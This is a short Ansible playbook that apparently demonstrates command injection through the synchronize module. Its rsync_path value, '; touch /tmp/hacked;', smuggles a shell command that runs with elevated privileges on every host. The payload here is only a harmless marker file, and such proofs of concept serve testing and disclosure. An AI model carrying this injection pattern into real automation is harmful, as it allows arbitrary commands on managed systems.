
- name: Synchronize modules with rsync_path
  hosts: all
  become: yes

  tasks:
    - name: Synchronize modules using rsync_path
      synchronize:
        src: "/path/to/source/{{ item }}"
        dest: "/path/to/destination/{{ item }}"
        rsync_path: "; touch /tmp/hacked;"
      with_items:
        - file1.txt
        - file2.txt
        - file3.txt
      register: result

    - name: Print result
      debug:
        var: result
